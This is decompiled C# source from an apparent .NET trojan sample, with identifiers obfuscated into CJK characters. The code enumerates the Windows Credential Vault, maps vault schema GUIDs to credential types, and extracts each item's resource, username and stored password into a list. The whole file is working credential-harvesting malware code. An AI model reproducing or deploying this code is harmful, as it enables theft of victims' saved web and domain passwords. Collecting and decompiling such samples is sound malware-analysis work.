// Decompiled with JetBrains decompiler
// Type: 釆聿韭牙彳夊舛鼠殳冫弋辛.口儿女土馬艮欠鼻血金勹艮鬯斤釆刀金
// Assembly: correcthit, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 98A8C508-DCA7-4494-BD18-281291040E34
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Shelpak.gen-d9c811eae2b07eca77f74ca45e1efee2a2c91add3f8606c489f526eb43f55287.exe

using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Security.Principal;
using 火長宀舛火尸彐方自儿丿广;

namespace 釆聿韭牙彳夊舛鼠殳冫弋辛
{
  internal sealed class 口儿女土馬艮欠鼻血金勹艮鬯斤釆刀金
  {
    public static List<田犬聿糸亠斗口雨糸癶片入> 走日人釆戶寸金冖人毛鬥廴鬯走()
    {
      List<田犬聿糸亠斗口雨糸癶片入> 田犬聿糸亠斗口雨糸癶片入List = new List<田犬聿糸亠斗口雨糸癶片入>();
      Version version = Environment.OSVersion.Version;
      int major = version.Major;
      int minor = version.Minor;
      Type type = major < 6 || minor < 2 ? typeof (毋辰高己水韋寸缶行面高屮尢角.豕爿手戈毛風爻肉鼻彳豆斗辵) : typeof (毋辰高己水韋寸缶行面高屮尢角.頁比田亠亅毛田自鹿屮彳);
      int 辛黽玉冂齊子力瓜耒毋 = 0;
      IntPtr zero1 = IntPtr.Zero;
      int num1 = 毋辰高己水韋寸缶行面高屮尢角.牙龠頁儿火廾爪爪夂斗士几(0, ref 辛黽玉冂齊子力瓜耒毋, ref zero1);
      if (num1 != 0)
        throw new Exception("[ERROR] Unable to enumerate vaults. Error (0x" + num1.ToString() + ")");
      IntPtr ptr1 = zero1;
      Dictionary<Guid, string> dictionary = new Dictionary<Guid, string>();
      dictionary.Add(new Guid("2F1A6504-0641-44CF-8BB5-3612D865F2E5"), "Windows Secure Note");
      dictionary.Add(new Guid("3CCD5499-87A8-4B10-A215-608888DD3B55"), "Windows Web Password Credential");
      dictionary.Add(new Guid("154E23D0-C644-4E6F-8CE6-5069272F999F"), "Windows Credential Picker Protector");
      dictionary.Add(new Guid("4BF4C442-9B8A-41A0-B380-DD4A704DDB28"), "Web Credentials");
      dictionary.Add(new Guid("77BC582B-F0A6-4E15-4E80-61736B6F3B29"), "Windows Credentials");
      dictionary.Add(new Guid("E69D7838-91B5-4FC9-89D5-230D4D4CC2BC"), "Windows Domain Certificate Credential");
      dictionary.Add(new Guid("3E0E35BE-1B77-43E7-B873-AED901B6275B"), "Windows Domain Password Credential");
      dictionary.Add(new Guid("3C886FF3-2669-4AA2-A8FB-3F6759A77548"), "Windows Extended Credential");
      dictionary.Add(new Guid("00000000-0000-0000-0000-000000000000"), (string) null);
      for (int index1 = 0; index1 < 辛黽玉冂齊子力瓜耒毋; ++index1)
      {
        Guid 鼻厂犬豸亅入二厂鹿冖夊斗毋 = new Guid(Marshal.PtrToStructure(ptr1, typeof (Guid)).ToString());
        ptr1 = (IntPtr) (ptr1.ToInt64() + (long) Marshal.SizeOf(typeof (Guid)));
        IntPtr zero2 = IntPtr.Zero;
        string str = !dictionary.ContainsKey(鼻厂犬豸亅入二厂鹿冖夊斗毋) ? 鼻厂犬豸亅入二厂鹿冖夊斗毋.ToString() : dictionary[鼻厂犬豸亅入二厂鹿冖夊斗毋];
        int num2 = 毋辰高己水韋寸缶行面高屮尢角.二冫小禾幺几勹聿疋辰犬貝(ref 鼻厂犬豸亅入二厂鹿冖夊斗毋, 0U, ref zero2);
        if (num2 != 0)
        {
          Console.WriteLine("Unable to open the following vault: " + str + ". Error: 0x" + num2.ToString());
        }
        else
        {
          int 厶門厶龜斤女巾自長冖魚片鹿 = 0;
          IntPtr zero3 = IntPtr.Zero;
          num2 = 毋辰高己水韋寸缶行面高屮尢角.毛矢頁石毛雨毋攴牛八宀宀氏攴(zero2, 512, ref 厶門厶龜斤女巾自長冖魚片鹿, ref zero3);
          if (num2 != 0)
          {
            Console.WriteLine("[ERROR] Unable to enumerate vault items from the following vault: " + str + ". Error 0x" + num2.ToString());
          }
          else
          {
            IntPtr ptr2 = zero3;
            if (厶門厶龜斤女巾自長冖魚片鹿 > 0)
            {
              for (int index2 = 1; index2 <= 厶門厶龜斤女巾自長冖魚片鹿; ++index2)
              {
                object structure1 = Marshal.PtrToStructure(ptr2, type);
                ptr2 = (IntPtr) (ptr2.ToInt64() + (long) Marshal.SizeOf(type));
                IntPtr zero4 = IntPtr.Zero;
                Guid guid = new Guid(structure1.GetType().GetField("SchemaId").GetValue(structure1).ToString());
                IntPtr num3 = (IntPtr) structure1.GetType().GetField("pResourceElement").GetValue(structure1);
                IntPtr num4 = (IntPtr) structure1.GetType().GetField("pIdentityElement").GetValue(structure1);
                IntPtr zero5 = IntPtr.Zero;
                if (major >= 6)
                {
                  if (minor >= 2)
                  {
                    try
                    {
                      IntPtr 目力火瓜勹色鼻手木山文隹山毋田 = (IntPtr) structure1.GetType().GetField("pPackageSid").GetValue(structure1);
                      num2 = 毋辰高己水韋寸缶行面高屮尢角.山勹生厂文立冫凵屮入黹曰人(zero2, ref guid, num3, num4, 目力火瓜勹色鼻手木山文隹山毋田, IntPtr.Zero, 0, ref zero4);
                      goto label_14;
                    }
                    catch
                    {
                      goto label_14;
                    }
                  }
                }
                num2 = 毋辰高己水韋寸缶行面高屮尢角.目耳寸口土爻丿宀火戈(zero2, ref guid, num3, num4, IntPtr.Zero, 0, ref zero4);
label_14:
                if (num2 != 0)
                {
                  Console.WriteLine("Error occured while retrieving vault item. Error: 0x" + num2.ToString());
                }
                else
                {
                  object structure2 = Marshal.PtrToStructure(zero4, type);
                  IntPtr 馬文子曰廴角二巛弓鬲舟 = (IntPtr) structure2.GetType().GetField("pAuthenticatorElement").GetValue(structure2);
                  田犬聿糸亠斗口雨糸癶片入 田犬聿糸亠斗口雨糸癶片入 = new 田犬聿糸亠斗口雨糸癶片入();
                  object vaultElementValue1 = GetVaultElementValue(num3);
                  if (vaultElementValue1 != null)
                    田犬聿糸亠斗口雨糸癶片入.巾厶氏卩斗見食襾冖門 = vaultElementValue1.ToString();
                  object vaultElementValue2 = GetVaultElementValue(num4);
                  if (vaultElementValue2 != null)
                    田犬聿糸亠斗口雨糸癶片入.立月尸戈豸口比土氏彡禾高 = vaultElementValue2.ToString();
                  object vaultElementValue3 = GetVaultElementValue(馬文子曰廴角二巛弓鬲舟);
                  if (vaultElementValue3 != null)
                    田犬聿糸亠斗口雨糸癶片入.彡卩見广鬥殳尸八馬火鳥又彡己毛勹日 = vaultElementValue3.ToString();
                  ++丿士止土巾幺山田巾弋宀小.黽囗厶甘豸夊几里一斗幺爪玄曰;
                  田犬聿糸亠斗口雨糸癶片入List.Add(田犬聿糸亠斗口雨糸癶片入);
                }
              }
            }
          }
        }
      }
      return 田犬聿糸亠斗口雨糸癶片入List;

      static object GetVaultElementValue(IntPtr 馬文子曰廴角二巛弓鬲舟)
      {
        object structure = Marshal.PtrToStructure(馬文子曰廴角二巛弓鬲舟, typeof (毋辰高己水韋寸缶行面高屮尢角.欠匸鹵竹革一水匸玄戈角斤黍));
        object obj = structure.GetType().GetField("Type").GetValue(structure);
        IntPtr ptr = (IntPtr) (馬文子曰廴角二巛弓鬲舟.ToInt64() + 16L);
        object vaultElementValue;
        switch ((int) obj)
        {
          case 0:
            vaultElementValue = (object) (bool) (object) Marshal.ReadByte(ptr);
            break;
          case 1:
            vaultElementValue = (object) Marshal.ReadInt16(ptr);
            break;
          case 2:
            vaultElementValue = (object) Marshal.ReadInt16(ptr);
            break;
          case 3:
            vaultElementValue = (object) Marshal.ReadInt32(ptr);
            break;
          case 4:
            vaultElementValue = (object) Marshal.ReadInt32(ptr);
            break;
          case 5:
            vaultElementValue = Marshal.PtrToStructure(ptr, typeof (double));
            break;
          case 6:
            vaultElementValue = Marshal.PtrToStructure(ptr, typeof (Guid));
            break;
          case 7:
            vaultElementValue = (object) Marshal.PtrToStringUni(Marshal.ReadIntPtr(ptr));
            break;
          case 12:
            vaultElementValue = (object) new SecurityIdentifier(Marshal.ReadIntPtr(ptr)).Value;
            break;
          default:
            vaultElementValue = (object) null;
            break;
        }
        return vaultElementValue;
      }
    }
  }
}
